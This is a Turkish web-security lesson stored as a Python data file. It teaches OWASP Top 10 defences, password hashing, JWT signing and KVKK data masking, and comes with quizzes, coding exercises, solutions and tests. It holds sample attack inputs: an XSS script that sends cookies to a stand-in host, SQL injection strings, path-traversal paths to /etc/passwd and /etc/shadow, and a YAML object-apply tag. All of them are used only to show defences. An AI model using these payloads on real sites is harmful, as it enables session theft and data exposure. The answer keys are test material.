LESSON = {
'id': 'web-guvenlik', 'lv': 'ileri', 'mod': 'Web ve API', 'min': 80,
'title': 'Güvenli Python ve web güvenliği',
'sum': 'OWASP Top 10 çerçevesinde SQL enjeksiyonu, XSS, CSRF, yol geçişi, güvensiz serileştirme ve gizli bilgi sızıntısını Python koduyla gösterip kapatırsın; parolayı tuzlu PBKDF2 ile saklar, HMAC ile imzalı token üretir, KVKK için kişisel veriyi maskeler ve anonimleştirirsin.',
'goals': [
 'OWASP Top 10 kategorilerini tanır, bir kod parçasındaki açığı doğru kategoriye yerleştirebilirim.',
 'SQL enjeksiyonunu ve XSS\'i gösterip parametreli sorgu ve HTML kaçışıyla kapatabilirim.',
 'Parolayı pbkdf2_hmac + tuz ile saklar, secrets ve hmac.compare_digest ile güvenli token üretip doğrularım.',
 'Yol geçişi, eval/pickle/yaml.load tehlikelerini ve bağımlılık açıklarını fark edip güvenli alternatifini yazabilirim.',
 'KVKK kapsamındaki kişisel veriyi maskeleme, takma adlandırma ve genelleme ile koruyabilirim.'],
'body': r'''
<h2>Neden önemli?</h2>
<p>Ilgaz Bank'ın internet şubesinde tek bir parametresiz SQL sorgusu, saldırganın tüm müşteri tablosunu okumasına yeter. Anadolu Market'in yorum alanında kaçırılmamış tek bir HTML çıktısı, başka müşterilerin oturum çerezlerini çalan bir betiğe dönüşebilir. Güvenlik "sonra bakarız" denilecek bir katman değildir; her fonksiyonda verdiğin küçük kararların toplamıdır. Bu derste saldırıyı önce <b>kendi gözünle görecek</b> (sqlite3 ve saf Python ile, tamamen yerel ve zararsız), sonra doğru kalıpla kapatacaksın.</p>
<div class="warn"><b>Etik çizgi</b>Buradaki teknikleri yalnız kendi kodunda, kendi test ortamında ya da yazılı izin aldığın sistemlerde dene. İzinsiz sisteme saldırı denemesi Türkiye'de de suçtur (TCK 243-245).</div>

<h2>OWASP Top 10: haritayı tanı</h2>
<p>OWASP (Open Worldwide Application Security Project), web uygulamalarında en sık ve en zararlı açık kategorilerini düzenli olarak yayımlar. Aşağıdaki tablo 2021 listesini özetler; yeni sürümler kategorileri yeniden sıralasa da özleri aynı kalır.</p>
<div class="tbl-wrap"><table>
<tr><th>Kod</th><th>Kategori</th><th>Python'da tipik örnek</th><th>Temel savunma</th></tr>
<tr><td>A01</td><td>Bozuk erişim kontrolü</td><td><code>/hesap/42</code> adresinde sahiplik kontrolü yok</td><td>Her istekte "bu kayıt bu kullanıcının mı?"</td></tr>
<tr><td>A02</td><td>Kriptografik hatalar</td><td>Parolayı MD5 ya da düz metin saklamak</td><td>PBKDF2/bcrypt/argon2, TLS</td></tr>
<tr><td>A03</td><td>Enjeksiyon (SQL, komut, XSS)</td><td>f-string ile SQL, <code>shell=True</code></td><td>Parametre, kaçış, izin listesi</td></tr>
<tr><td>A04</td><td>Güvensiz tasarım</td><td>Sınırsız deneme hakkı olan şifre sıfırlama</td><td>Tehdit modelleme, oran sınırı</td></tr>
<tr><td>A05</td><td>Yanlış yapılandırma</td><td>Üretimde <code>DEBUG=True</code></td><td>Güvenli varsayılan, denetim listesi</td></tr>
<tr><td>A06</td><td>Açıklı/eski bileşen</td><td>Yıllardır güncellenmemiş paket</td><td><code>pip-audit</code>, sürüm sabitleme</td></tr>
<tr><td>A07</td><td>Kimlik doğrulama hataları</td><td>Zayıf parola, tahmin edilebilir token</td><td><code>secrets</code>, MFA, kilitleme</td></tr>
<tr><td>A08</td><td>Yazılım/veri bütünlüğü</td><td>Güvenilmeyen veriyi <code>pickle.loads</code></td><td>JSON, imza doğrulama</td></tr>
<tr><td>A09</td><td>Günlük ve izleme eksikliği</td><td>Başarısız girişler loglanmıyor</td><td>Yapılandırılmış log, alarm</td></tr>
<tr><td>A10</td><td>SSRF</td><td>Kullanıcının verdiği URL'ye sunucudan istek</td><td>Hedef izin listesi</td></tr>
</table></div>

<h2>SQL enjeksiyonu: görmek ve kapatmak</h2>
<p>Kullanıcı girdisini SQL metnine yapıştırdığında, girdi <b>veri</b> olmaktan çıkıp <b>kod</b> olur. Aşağıda giriş formu taklidi var; parolayı bilmeden içeri giriliyor.</p>
<pre class="py">
import sqlite3
db = sqlite3.connect(":memory:")
db.execute("CREATE TABLE kullanici (ad TEXT, parola TEXT)")
db.execute("INSERT INTO kullanici VALUES ('ayse', 'Gizli!123')")

def giris_acikli(ad, parola):
    sql = f"SELECT COUNT(*) FROM kullanici WHERE ad = '{ad}' AND parola = '{parola}'"
    print("Çalışan SQL:", sql)
    return db.execute(sql).fetchone()[0] > 0

def giris_guvenli(ad, parola):
    sql = "SELECT COUNT(*) FROM kullanici WHERE ad = ? AND parola = ?"
    return db.execute(sql, (ad, parola)).fetchone()[0] > 0

saldiri = "' OR '1'='1"
print("Açıklı :", giris_acikli("ayse", saldiri))
print("Güvenli:", giris_guvenli("ayse", saldiri))
</pre>
<p>Parametreli sorguda (<code>?</code> ya da <code>%s</code>) değer sürücüye SQL metninden <b>ayrı</b> gider; içinde tırnak olsa bile hiçbir zaman kod olarak yorumlanmaz. Parametre yalnız <b>değerler</b> için çalışır; tablo ya da sütun adı (ör. kullanıcının seçtiği sıralama alanı) dinamikse onu bir <b>izin listesiyle</b> (allowlist) doğrularsın. ORM'ler (SQLAlchemy, Django) varsayılan olarak parametre kullanır; <code>text()</code> ya da <code>raw()</code> içinde f-string yazdığın anda bu koruma biter. Aynı ilke işletim sistemi komutları için de geçerlidir: <code>subprocess.run(["ping", host])</code> liste biçiminde güvenlidir, <code>shell=True</code> ile metin vermek komut enjeksiyonuna kapı açar.</p>

<h2>XSS ve HTML kaçışı</h2>
<p>Siteler arası betik çalıştırma (Cross-Site Scripting, XSS), kullanıcı verisinin HTML'e kaçırılmadan basılmasıyla olur. Tarayıcı, yorum alanına yazılmış <code>&lt;script&gt;</code> etiketini sayfanın kodu sanar ve çalıştırır.</p>
<pre class="py">
import html
from jinja2 import Environment

yorum = '<script>fetch("https://kotu.example/?c=" + document.cookie)</script>'
print("Kaçışsız :", "<p>" + yorum + "</p>")
print("Kaçışlı  :", "<p>" + html.escape(yorum) + "</p>")

env = Environment(autoescape=True)
sablon = env.from_string("<p>{{ ad }} yorum yaptı: {{ yorum }}</p>")
print(sablon.render(ad="Ayşe", yorum=yorum))
</pre>
<div class="tbl-wrap"><table>
<tr><th>Karakter</th><th>Kaçış</th><th>Neden</th></tr>
<tr><td><code>&lt;</code> <code>&gt;</code></td><td><code>&amp;lt;</code> <code>&amp;gt;</code></td><td>Etiket açılmasın</td></tr>
<tr><td><code>&amp;</code></td><td><code>&amp;amp;</code></td><td>Varlık (entity) karışmasın</td></tr>
<tr><td><code>"</code> <code>'</code></td><td><code>&amp;quot;</code> <code>&amp;#x27;</code></td><td>Öznitelik değerinden taşmasın</td></tr>
</table></div>
<p>Jinja2'de <code>autoescape=True</code> (Flask'ta varsayılan açık), Django şablonlarında otomatik kaçış varsayılandır. Kaçışı <code>|safe</code> ya da <code>Markup()</code> ile kapatmak, "bu veriye güveniyorum" demektir; kullanıcı verisi için asla yapma. Ek savunma katmanı olarak Content-Security-Policy (CSP) başlığı ve çerezlerde <code>HttpOnly</code> kullanılır.</p>

<h2>Parola saklama: özet, tuz, sabit zamanlı karşılaştırma</h2>
<p>Parola <b>asla</b> düz metin ya da şifrelenmiş (geri çözülebilir) saklanmaz; yavaş, tuzlu bir özet (hash) saklanır. Tuz (salt) her kullanıcı için rastgele üretilir; aynı parolaya sahip iki kullanıcının özetleri farklı olur ve önceden hesaplanmış tablolar işe yaramaz. Yinelemeli (iterated) özet, her tahmini saldırgan için pahalı kılar. MD5 ve tek tur SHA-256 parola için uygun değildir, çünkü çok hızlıdır.</p>
<pre class="py">
import hashlib, hmac, secrets

TUR = 100_000   # gerçekte sha256 için 600 bin civarı önerilir

def parola_ozetle(parola: str) -> str:
    tuz = secrets.token_bytes(16)
    ozet = hashlib.pbkdf2_hmac("sha256", parola.encode(), tuz, TUR)
    return "$".join(["pbkdf2_sha256", str(TUR), tuz.hex(), ozet.hex()])

def parola_dogrula(parola: str, kayit: str) -> bool:
    _, tur, tuz_hex, ozet_hex = kayit.split("$")
    aday = hashlib.pbkdf2_hmac("sha256", parola.encode(), bytes.fromhex(tuz_hex), int(tur))
    return hmac.compare_digest(aday.hex(), ozet_hex)

k1, k2 = parola_ozetle("Anadolu2025!"), parola_ozetle("Anadolu2025!")
print(k1[:40] + "...")
print("Aynı parola, farklı özet:", k1 != k2)
print(parola_dogrula("Anadolu2025!", k1), parola_dogrula("anadolu2025!", k1))
</pre>
<p><code>hmac.compare_digest</code> iki değeri <b>sabit zamanda</b> karşılaştırır. Normal <code>==</code> ilk farklı karakterde durur; süre farkını ölçen bir saldırgan doğru öneki karakter karakter tahmin edebilir (zamanlama saldırısı). <code>secrets</code> modülü kriptografik olarak güvenli rastgelelik verir; token, tuz, sıfırlama kodu için <code>random</code> kullanılmaz, çünkü <code>random</code> tahmin edilebilir.</p>
<pre class="code">
# Kendi bilgisayarında: pip install argon2-cffi bcrypt
from argon2 import PasswordHasher
ph = PasswordHasher()
kayit = ph.hash("Anadolu2025!")      # tuz ve parametreler kaydın içinde
ph.verify(kayit, "Anadolu2025!")      # yanlışsa VerifyMismatchError

import bcrypt
kayit = bcrypt.hashpw(b"Anadolu2025!", bcrypt.gensalt(rounds=12))
bcrypt.checkpw(b"Anadolu2025!", kayit)
</pre>
<p>Yeni projede argon2id ya da bcrypt tercih edilir; Django varsayılan olarak PBKDF2 kullanır ve argon2'ye geçmeyi destekler. Standart kütüphaneyle kalman gerekirse <code>pbkdf2_hmac</code> doğru seçimdir.</p>

<h2>İmzalı token ve JWT</h2>
<p>JWT (JSON Web Token) üç parçadır: <code>başlık.yük.imza</code>; ilk ikisi base64url ile kodlanmış JSON'dur. Yük <b>şifreli değildir</b>, herkes okuyabilir; güvenliği imzadan gelir: sunucu, gizli anahtarla HMAC-SHA256 imzası hesaplar ve gelen token'daki imzayla karşılaştırır. Yükte parola, TC kimlik no gibi gizli veri taşınmaz; <code>exp</code> (son kullanma) alanı mutlaka kontrol edilir.</p>
<pre class="py">
import base64, hashlib, hmac, json

def b64(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

ANAHTAR = b"ortam-degiskeninden-gelen-uzun-rastgele-anahtar"
baslik = b64(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
yuk = b64(json.dumps({"sub": "M-101", "rol": "musteri", "exp": 1767225600}).encode())
imza = b64(hmac.new(ANAHTAR, f"{baslik}.{yuk}".encode(), hashlib.sha256).digest())
token = f"{baslik}.{yuk}.{imza}"
print(token[:60] + "...")
# Yük herkes tarafından okunabilir:
print(json.loads(base64.urlsafe_b64decode(yuk + "==")))
</pre>
<p>Gerçek projede <code>PyJWT</code> kullan (<code>jwt.encode</code>, <code>jwt.decode(token, anahtar, algorithms=["HS256"])</code>). <code>algorithms</code> listesini her zaman açıkça ver; "alg: none" kabul eden doğrulayıcılar tarihin klasik açıklarındandır.</p>

<h2>CSRF ve girdi doğrulama</h2>
<p>Siteler arası istek sahteciliği (Cross-Site Request Forgery, CSRF), kullanıcı bankada oturum açıkken başka bir sitenin onun tarayıcısına gizlice "havale yap" formu göndertmesidir. Tarayıcı çerezi otomatik eklediği için sunucu isteği meşru sanar. Savunma: durum değiştiren her istek POST/PUT/DELETE olur, formda sunucunun ürettiği ve oturuma bağlı bir <b>CSRF token</b> bulunur, çerezler <code>SameSite=Lax</code> ya da <code>Strict</code> işaretlenir. Django bunu varsayılan yapar, Flask'ta Flask-WTF eklenir. Yalnız Authorization başlığıyla token taşıyan API'ler CSRF'ten büyük ölçüde etkilenmez.</p>
<p>Girdi doğrulamada kural: <b>izin listesi, yasak listesinden iyidir</b>. "Kötü karakterleri temizlemeye" çalışmak yerine neyin geçerli olduğunu tanımla (uzunluk, karakter kümesi, aralık, biçim) ve geri kalan her şeyi reddet. Pydantic dersinde gördüğün şema doğrulaması bunun en temiz yoludur. Doğrulama sunucuda yapılır; tarayıcıdaki doğrulama yalnız kullanıcı deneyimidir.</p>

<h2>Yol geçişi (path traversal)</h2>
<p>"Rapor indir" uç noktası dosya adını kullanıcıdan alıyorsa, <code>../../etc/passwd</code> gibi bir ad kök klasörün dışına çıkar. Doğru savunma: yolu birleştir, <code>resolve()</code> ile gerçek yola çevir ve kök klasörün <b>içinde</b> kaldığını <code>is_relative_to</code> ile kontrol et. Metin olarak <code>startswith</code> kontrolü yetmez: <code>/srv/raporlar_gizli</code>, <code>/srv/raporlar</code> ile başlar.</p>
<pre class="py">
from pathlib import Path

KOK = Path("/srv/raporlar").resolve()

def guvenli_yol(ad: str) -> Path:
    yol = (KOK / ad).resolve()
    if not yol.is_relative_to(KOK):
        raise PermissionError(f"izin verilmeyen yol: {ad}")
    return yol

for ad in ["2025/ocak.csv", "../../etc/passwd", "/etc/shadow", "../raporlar_gizli/x.csv"]:
    try:
        print("OK  ", guvenli_yol(ad))
    except PermissionError as e:
        print("RED ", e)
</pre>

<h2>eval, pickle ve yaml.load: kodu veriyle karıştırma</h2>
<p><code>eval</code>/<code>exec</code> verilen metni kod olarak çalıştırır; kullanıcıdan gelen "formül" ile sunucunda istediği komutu çalıştırabilir. <code>pickle.loads</code> güvenilmeyen veride keyfi kod çalıştırabilir, çünkü pickle nesne kurarken çağrılacak fonksiyonu verinin içinde taşıyabilir. <code>yaml.load</code> da tam yükleyiciyle Python nesnesi kurabilir.</p>
<pre class="py">
import ast, json, yaml

print(ast.literal_eval("[1, 2, {'a': 3}]"))          # yalnız sabit değerler
try:
    ast.literal_eval("__import__('os').getcwd()")
except ValueError as e:
    print("literal_eval reddetti:", type(e).__name__)

metin = "sunucu: anadolu\nport: 8080\netiketler: [web, api]"
print(yaml.safe_load(metin))
try:
    yaml.safe_load("!!python/object/apply:os.getcwd []")
except yaml.YAMLError as e:
    print("safe_load reddetti:", type(e).__name__)
print(json.loads('{"tutar": 150.5}'))                 # veri alışverişinde JSON
</pre>
<div class="tbl-wrap"><table>
<tr><th>Tehlikeli</th><th>Güvenli alternatif</th></tr>
<tr><td><code>eval(girdi)</code></td><td><code>ast.literal_eval</code>, ya da <code>ast</code> ile sınırlı ifade değerlendirici</td></tr>
<tr><td><code>pickle.loads(dis_veri)</code></td><td><code>json</code>; pickle yalnız kendi ürettiğin ve imzaladığın veride</td></tr>
<tr><td><code>yaml.load(metin)</code></td><td><code>yaml.safe_load(metin)</code></td></tr>
<tr><td><code>subprocess.run(metin, shell=True)</code></td><td><code>subprocess.run(["komut", arg])</code></td></tr>
<tr><td><code>random.choice</code> ile token</td><td><code>secrets.token_urlsafe(32)</code></td></tr>
</table></div>

<h2>Bağımlılıklar ve gizli bilgiler</h2>
<pre class="code">
pip install pip-audit bandit
pip-audit -r requirements.txt     # bilinen açıkları (CVE) listeler
bandit -r src/                     # kodda eval, shell=True, zayıf hash gibi kalıpları arar
pip install --require-hashes -r requirements.txt   # paket bütünlüğü
</pre>
<p>Gizli bilgi (API anahtarı, veritabanı parolası, JWT anahtarı) koda ve git'e girmez: ortam değişkeni ya da bir gizli yönetici (Vault, bulut secret manager) kullanılır; <code>.env</code> dosyası <code>.gitignore</code>'a eklenir. Git geçmişine bir kez giren anahtar silinse bile geçmişte kalır; yapılacak şey anahtarı <b>iptal edip yenisini üretmektir</b>. Loglara parola, token, kart numarası yazılmaz; yazılacaksa maskelenir. Hata mesajları kullanıcıya iç ayrıntı (SQL, yığın izi) göstermez.</p>

<h2>KVKK: kişisel veriyi korumak</h2>
<p>6698 sayılı Kişisel Verilerin Korunması Kanunu (KVKK), kişisel veriyi işleyen her kurumu bağlar. Geliştirici olarak sorumluluğun: <b>veri minimizasyonu</b> (ihtiyacın olmayan alanı toplama), <b>maskeleme</b> (ekranda ve logda <code>123******01</code>), <b>takma adlandırma</b> (pseudonymization: kimliği anahtarlı bir özetle değiştirmek; anahtar olmadan geri dönülemez ama aynı kişi aynı takma adı alır) ve <b>anonimleştirme</b> (kişiyi hiçbir şekilde tanımlanamaz hale getirmek: adı silmek, yaşı aralığa, adresi il düzeyine indirmek). Analiz ve test ortamına üretim verisi bu işlemlerden geçmeden kopyalanmaz.</p>
<pre class="py">
import hmac, hashlib

ANAHTAR = b"kvkk-takma-ad-anahtari"

def maskele_tc(tc: str) -> str:
    return tc[:3] + "*" * 6 + tc[-2:]

def maskele_eposta(e: str) -> str:
    ad, alan = e.split("@")
    return ad[0] + "***@" + alan

def takma_ad(tc: str) -> str:
    return "K-" + hmac.new(ANAHTAR, tc.encode(), hashlib.sha256).hexdigest()[:10]

def yas_araligi(yas: int) -> str:
    alt = yas // 10 * 10
    return f"{alt}-{alt + 9}"

kayit = {"ad": "Ayşe Kaya", "tc": "12345678901", "eposta": "ayse.kaya@example.com", "yas": 34, "il": "İzmir"}
print("Maskeli :", maskele_tc(kayit["tc"]), maskele_eposta(kayit["eposta"]))
print("Analiz  :", {"kisi": takma_ad(kayit["tc"]), "yas": yas_araligi(kayit["yas"]), "il": kayit["il"]})
print("Aynı kişi aynı takma ad:", takma_ad("12345678901") == takma_ad("12345678901"))
</pre>
<div class="tip"><b>Altın kurallar</b>Güvenme, doğrula (girdi). Kaçır (çıktı). Parametrele (sorgu). Özetle ve tuzla (parola). Gizli tut (anahtar). En az yetki ver (hesap, veritabanı kullanıcısı). Logla ama maskele.</div>
<div class="note"><b>Gerçek işte</b>Bankacılık ve e-ticaret projelerinde kod incelemesinde (code review) güvenlik kontrol listesi kullanılır: SQL'de f-string var mı, şablonda <code>|safe</code> var mı, parola nasıl saklanıyor, endpoint sahiplik kontrolü yapıyor mu, log'a kişisel veri gidiyor mu. CI hattında bandit, pip-audit ve gitleaks gibi araçlar her PR'da çalışır; yüksek önem dereceli bulgu birleştirmeyi durdurur. Sızma testi (penetration test) yılda en az bir kez ve büyük sürümlerden önce yapılır.</div>

<section class="deep"><span class="eyebrow">Uzmanlaş</span>
<h3>Tehdit modelleme</h3>
<p>Kod yazmadan önce sor: varlıklarımız neler (müşteri verisi, para transferi), kim saldırabilir, hangi giriş noktaları var, en kötü senaryo ne? STRIDE (Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege) her bileşen için bir kontrol listesi verir.</p>
<h3>Derinlemesine savunma</h3>
<p>Tek önleme güvenme. Parametreli sorgu + en az yetkili veritabanı kullanıcısı + WAF + izleme. Güvenlik başlıkları (<code>Content-Security-Policy</code>, <code>Strict-Transport-Security</code>, <code>X-Content-Type-Options: nosniff</code>), oturum çerezlerinde <code>Secure; HttpOnly; SameSite</code>, giriş ve şifre sıfırlamada oran sınırlama (rate limiting) ve hesap kilitleme, yetki kontrollerinde "varsayılan reddet".</p>
<h3>Kriptografiyi kendin icat etme</h3>
<p>Kendi şifreleme algoritmanı yazma; <code>cryptography</code> paketinin yüksek seviyeli <code>Fernet</code> API'si gibi denetlenmiş araçları kullan. Bu derste HMAC ile imza yazmamızın amacı mekanizmayı anlamaktır; üretimde PyJWT, itsdangerous gibi olgun kütüphaneler tercih edilir.</p>
</section>
''',
'ex': [
 {'t': 'mc', 'stage': 'Isınma',
  'q': 'Parametreli sorgunun (<code>execute(sql, (ad,))</code>) SQL enjeksiyonunu önlemesinin asıl nedeni nedir?',
  'o': ['Tırnak ve noktalı virgül karakterlerini girdiden otomatik olarak siler', 'Değer SQL metninden ayrı gider ve asla kod olarak yorumlanmaz', 'Sorguyu şifreleyerek veritabanı sunucusuna güvenli kanaldan gönderir', 'Yalnız SELECT sorgularında çalışır, diğerlerinde koruma sağlamaz'], 'a': 1,
  'why': 'Sürücü SQL\'i önce derler, değeri ayrı bir kanal olarak bağlar; değer içinde ne olursa olsun veri olarak kalır. Hiçbir karakter silinmez, şifreleme yapılmaz ve INSERT/UPDATE için de çalışır.'},
 {'t': 'mc', 'stage': 'Isınma',
  'q': 'Token karşılaştırırken <code>==</code> yerine <code>hmac.compare_digest</code> kullanmanın nedeni nedir?',
  'o': ['Uzun token\'larda == operatöründen belirgin biçimde daha hızlı çalışır', 'Büyük/küçük harf farkını yok sayarak kullanıcı hatalarını tolere eder', 'Karşılaştırma süresi farkından bilgi sızmasını (zamanlama saldırısı) önler', 'Karşılaştırmadan önce iki token\'ı da otomatik olarak şifreler'], 'a': 2,
  'why': '== ilk farklı karakterde durduğu için süre, eşleşen önek uzunluğuna göre değişir; compare_digest her zaman aynı sürede biter. Hızlı değildir, harf duyarlıdır ve şifreleme yapmaz.'},
 {'t': 'mc', 'stage': 'Isınma',
  'q': 'Kullanıcının yüklediği bir yapılandırma dosyasını okuyacaksın. Hangisi güvenlidir?',
  'o': ['<code>pickle.loads(veri)</code>', '<code>eval(metin)</code>', '<code>yaml.safe_load(metin)</code>', '<code>yaml.load(metin, Loader=yaml.Loader)</code>'], 'a': 2,
  'why': 'safe_load yalnız temel YAML türlerini (sözlük, liste, metin, sayı) kurar. pickle ve tam yükleyicili yaml.load veri içinden Python nesnesi ve çağrı kurabilir; eval ise metni doğrudan kod olarak çalıştırır.'},
 {'t': 'predict', 'stage': 'Kodu oku',
  'q': 'Bu kod ne yazdırır?',
  'code': r'''import html
ad = '<b>Ayşe & "Can"</b>'
print(html.escape(ad))
''',
  'o': ['&lt;b&gt;Ayşe &amp; &quot;Can&quot;&lt;/b&gt;', '&lt;b&gt;Ayşe & "Can"&lt;/b&gt;', '<b>Ayşe &amp; &quot;Can&quot;</b>', '&lt;b&gt;Ayşe &amp; "Can"&lt;/b&gt;'], 'a': 0,
  'why': 'html.escape varsayılan olarak (quote=True) &lt;, &gt;, &amp; karakterlerinin yanında çift ve tek tırnağı da kaçırır. Böylece değer HTML özniteliği içine konsa bile taşamaz.'},
 {'t': 'predict', 'stage': 'Kodu oku',
  'q': 'Enjeksiyon denemesi: bu kod kaç satır sayar?',
  'code': r'''import sqlite3
db = sqlite3.connect(":memory:")
db.execute("CREATE TABLE hesap (no TEXT, sahip TEXT)")
db.executemany("INSERT INTO hesap VALUES (?, ?)", [("TR1", "ayse"), ("TR2", "can"), ("TR3", "ece")])
girdi = "ayse' OR '1'='1"
acikli = db.execute(f"SELECT COUNT(*) FROM hesap WHERE sahip = '{girdi}'").fetchone()[0]
guvenli = db.execute("SELECT COUNT(*) FROM hesap WHERE sahip = ?", (girdi,)).fetchone()[0]
print(acikli, guvenli)
''',
  'o': ['1 1', '3 0', '3 3', '1 0'], 'a': 1,
  'why': 'f-string\'li sorguda koşul sahip = \'ayse\' OR \'1\'=\'1\' olur; her satır için doğrudur ve 3 hesabın hepsi sayılır. Parametreli sorguda tüm metin tek bir sahip adı olarak aranır; böyle bir ad olmadığı için 0.'},
 {'t': 'predict', 'stage': 'Kodu oku',
  'q': 'Metin tabanlı yol kontrolü: bu kod ne yazdırır?',
  'code': r'''kok = "/srv/raporlar"
for yol in ["/srv/raporlar/ocak.csv", "/srv/raporlar_gizli/maas.csv"]:
    print(yol.startswith(kok))
''',
  'o': ['True\nFalse', 'True\nTrue', 'False\nFalse', 'False\nTrue'], 'a': 1,
  'why': '"/srv/raporlar_gizli/maas.csv" metni "/srv/raporlar" ile başlar; startswith bu yüzden kök dışındaki klasörü de içeride sanır. Doğru kontrol Path.resolve() ve is_relative_to ile klasör sınırlarına bakar.'},
 {'t': 'order', 'stage': 'Kodu oku',
  'q': '<p>Parolayı tuzlu PBKDF2 ile özetleyip sonra doğrulayan programın satırlarını sırala.</p>',
  'lines': ['import hashlib, hmac, secrets', 'tuz = secrets.token_bytes(16)', 'kayit = (tuz, hashlib.pbkdf2_hmac("sha256", b"Anadolu2025!", tuz, 50_000))', 'aday = hashlib.pbkdf2_hmac("sha256", b"Anadolu2025!", kayit[0], 50_000)', 'print(hmac.compare_digest(aday, kayit[1]))'],
  'expect': 'True\n',
  'hint': 'Önce kayıt anı (tuz + özet), sonra giriş anı (aynı tuzla yeniden özet), en son sabit zamanlı karşılaştırma.',
  'why': 'Doğrulama, saklanan tuzla girilen parolayı aynı tur sayısıyla yeniden özetleyip sonuçları compare_digest ile karşılaştırmaktır. Parolanın kendisi hiçbir yerde saklanmaz.'},
 {'id': 'web-guvenlik-1', 't': 'code', 'stage': 'Rehberli', 'diff': 1,
  'q': '<p><code>yorum_karti(ad, yorum)</code> fonksiyonunu yaz: <code>&lt;div class="yorum"&gt;&lt;b&gt;AD&lt;/b&gt;&lt;p&gt;YORUM&lt;/p&gt;&lt;/div&gt;</code> biçiminde HTML döndürsün. Ad ve yorum kullanıcıdan geldiği için ikisi de <code>html.escape</code> ile kaçırılmalı; ayrıca yorumdaki satır sonları (<code>\\n</code>) kaçıştan <b>sonra</b> <code>&lt;br&gt;</code>\'e çevrilmeli.</p>',
  'guide': ['html modülünü içe aktar.', 'Adı ve yorumu html.escape ile kaçır.', 'Kaçırılmış yorumda "\\n" karakterlerini "&lt;br&gt;" ile değiştir (sıra önemli: önce kaçış).', 'f-string ile kalıbı doldurup döndür.'],
  'example': 'import html\nurun = "Çay & Şeker <indirim>"\nprint(f"<li>{html.escape(urun)}</li>")\n',
  'start': r'''import html

def yorum_karti(ad, yorum):
    # TODO: ad ve yorumu kaçır, yorumdaki satır sonlarını <br> yap
    return f'<div class="yorum"><b>{ad}</b><p>{yorum}</p></div>'
''',
  'sol': r'''import html

def yorum_karti(ad, yorum):
    guvenli_ad = html.escape(ad)
    guvenli_yorum = html.escape(yorum).replace("\n", "<br>")
    return f'<div class="yorum"><b>{guvenli_ad}</b><p>{guvenli_yorum}</p></div>'
''',
  'tests': r'''assert yorum_karti("Ayşe", "Çok iyi") == '<div class="yorum"><b>Ayşe</b><p>Çok iyi</p></div>', "zararsız metin aynen basılmalı"
k = yorum_karti("<script>x()</script>", "a<img src=x onerror=alert(1)>")
assert "<script>" not in k and "<img" not in k, "kullanıcı verisindeki etiketler kaçırılmalı"
assert "&lt;script&gt;" in k, "< işareti &lt; olmalı"
assert yorum_karti("Can", "satır1\nsatır2").endswith("<p>satır1<br>satır2</p></div>"), "satır sonları <br> olmalı"
assert "&lt;br&gt;" in yorum_karti("x", "<br>"), "kullanıcının yazdığı <br> etiket olarak değil metin olarak kalmalı: önce kaçış, sonra dönüşüm"
''',
  'hints': ['html.escape(metin) <, >, &, ve tırnakları varlıklara çevirir.', 'Önce kaçırırsan senin eklediğin <br> bozulmaz; önce <br> eklersen kaçış onu da bozar.', 'html.escape(yorum).replace("\\n", "<br>")'],
  'why': 'Çıktı kaçışı XSS\'in temel savunmasıdır. Güvenli biçimlendirmeyi (br) kaçıştan sonra eklemek, kullanıcının kendi etiketlerini sokmasını engellerken senin eklediğin etiketin çalışmasını sağlar.'},
 {'id': 'web-guvenlik-2', 't': 'code', 'stage': 'Rehberli', 'diff': 2,
  'q': '<p>İki fonksiyon yaz:</p><ul><li><code>parola_ozetle(parola, tur=20000)</code>: 16 baytlık rastgele tuz (<code>secrets</code>) üretip PBKDF2-HMAC-SHA256 uygulasın ve <code>"pbkdf2_sha256$TUR$TUZHEX$OZETHEX"</code> metnini döndürsün.</li><li><code>parola_dogrula(parola, kayit)</code>: kaydı ayrıştırıp aynı tuz ve turla yeniden özetlesin, <code>hmac.compare_digest</code> ile karşılaştırıp <code>True/False</code> döndürsün. Bozuk biçimli kayıtta (4 parça değilse ya da algoritma <code>pbkdf2_sha256</code> değilse) <code>False</code> döndürsün.</li></ul>',
  'guide': ['secrets.token_bytes(16) ile tuz üret.', 'hashlib.pbkdf2_hmac("sha256", parola.encode(), tuz, tur) ile özet al.', 'Kayıt metnini $ ile birleştir: algoritma, tur, tuz.hex(), ozet.hex().', 'Doğrulamada split("$") ile parçala, parça sayısını ve algoritmayı kontrol et.', 'bytes.fromhex ile tuzu geri al, yeniden özetle, compare_digest ile karşılaştır.'],
  'example': 'import hashlib\nozet = hashlib.pbkdf2_hmac("sha256", b"deneme", b"tuz12345", 1000)\nprint(len(ozet), ozet.hex()[:16])\nprint("a$b$c".split("$"))\n',
  'start': r'''import hashlib, hmac, secrets

def parola_ozetle(parola, tur=20000):
    # TODO: tuz üret, özetle, kayıt metnini döndür
    pass

def parola_dogrula(parola, kayit):
    # TODO: ayrıştır, yeniden özetle, sabit zamanlı karşılaştır
    pass
''',
  'sol': r'''import hashlib, hmac, secrets

def parola_ozetle(parola, tur=20000):
    tuz = secrets.token_bytes(16)
    ozet = hashlib.pbkdf2_hmac("sha256", parola.encode(), tuz, tur)
    return f"pbkdf2_sha256${tur}${tuz.hex()}${ozet.hex()}"

def parola_dogrula(parola, kayit):
    parcalar = kayit.split("$")
    if len(parcalar) != 4 or parcalar[0] != "pbkdf2_sha256":
        return False
    _, tur, tuz_hex, ozet_hex = parcalar
    aday = hashlib.pbkdf2_hmac("sha256", parola.encode(), bytes.fromhex(tuz_hex), int(tur))
    return hmac.compare_digest(aday.hex(), ozet_hex)
''',
  'tests': r'''k1 = parola_ozetle("Anadolu2025!")
k2 = parola_ozetle("Anadolu2025!")
assert isinstance(k1, str) and k1.startswith("pbkdf2_sha256$20000$"), f"kayıt biçimi pbkdf2_sha256$20000$... olmalı; gelen {k1}"
p = k1.split("$")
assert len(p) == 4 and len(bytes.fromhex(p[2])) == 16 and len(bytes.fromhex(p[3])) == 32, "16 bayt tuz ve 32 bayt SHA-256 özeti hex olarak saklanmalı"
assert k1 != k2, "aynı parola iki kez özetlenince tuz farklı olduğu için kayıtlar farklı olmalı"
assert parola_dogrula("Anadolu2025!", k1) is True, "doğru parola True"
assert parola_dogrula("anadolu2025!", k1) is False, "harf duyarlı: yanlış parola False"
assert parola_dogrula("x", "md5$abc") is False and parola_dogrula("x", "sha1$1$00$00") is False, "bozuk ya da desteklenmeyen kayıt False"
assert "compare_digest" in __source__, "karşılaştırmada hmac.compare_digest kullanılmalı"
